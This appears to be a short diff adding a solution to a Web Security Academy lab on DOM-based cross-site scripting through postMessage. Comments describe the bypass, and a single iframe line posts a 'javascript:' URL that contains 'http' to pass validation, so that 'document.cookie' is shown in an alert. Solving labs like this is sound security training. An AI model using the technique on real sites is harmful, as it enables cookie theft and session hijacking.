@@ -1,0 +1,7 @@
+// Search for addEventListener() in lab home page
+// Validation of MessageEvent data must contain http or https
+// data then rendered in location.href
+// Be sensitive to href and src attribute tag
+// Use pseudo-javascript protocol to trigger xss
+<iframe src="https://acb31f051ea38ba9807a3419004e00a2.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(document.cookie);//http:', '*')"></iframe>
+
